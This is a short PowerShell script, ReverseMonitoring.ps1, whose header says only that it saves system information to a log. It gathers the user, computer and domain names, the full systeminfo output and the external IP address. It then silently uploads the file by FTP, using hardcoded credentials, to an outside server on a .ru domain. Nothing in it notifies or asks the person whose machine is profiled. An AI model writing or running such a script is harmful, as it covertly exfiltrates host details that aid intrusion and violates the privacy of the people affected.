# **********************************************************
#
# ReverseMonitoring.ps1
#
# This script Save System Information at File sysdump.log
#
#**********************************************************/

### Set Constants
$prefixc = "ftp"
$domainc = "linserver.anticriminalonline.ru"
$portc = 21
$serverdirc = "/tmp/Files/"
$userc = "MSSQLSR"
$passwordc = "Admin01234"
$prefixfilename = "sysdump"
$echomessage = ""

### Set Variables
$WC = new-object System.Net.WebClient
$WC.Proxy = $null$Wc.Credentials = New-Object System.Net.NetworkCredential( $userc, $passwordc)

## Set Temprorary Constants

$curdatetimestamp = Get-Date -Format "yyyy-MM-dd_HH-mm"
$compindent = "$env:USERNAME@$env:COMPUTERNAME@$env:USERDOMAIN"
$localfilename = "$prefixfilename-$compindent.log"
$localfile="$env:USERPROFILE\$localfilename"
$urlc = "${prefixc}://${domainc}:$portc$serverdirc$localfilename"

# Популярное решение "устранения" ошибки: Exception setting "OutputEncoding": "The handle is invalid."
& cmd /c ver | Out-Null

$encoding = [Console]::OutputEncoding 
[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("cp866")
try
{
    Echo "$localfilename::" | Out-File $localfile
    Echo "Message: $echomessage" | Out-File $localfile -Append
    Echo "Time Stamp: $curdatetimestamp" | Out-File $localfile -Append
    Echo "USER/COMPUTER/DOMAIN Name: $compindent" | Out-File $localfile -Append
    & systeminfo.exe | Out-File $localfile -Append
    Echo " ===***=== " | Out-File $localfile -Append
    Echo "External ip = " | Out-File $localfile -Append
    (Invoke-WebRequest -uri "http://ifconfig.me/ip" -UseBasicParsing ).Content | Out-File $localfile -Append
}
finally
{
    [Console]::OutputEncoding = $encoding
}

try
{
    $uri = New-Object System.Uri( $urlc )
    $WC. UploadFile( $uri,$localfile )
    #end try
 }
 catch
 {
    $err = $_
    Write-Host $error.exeption.message
}
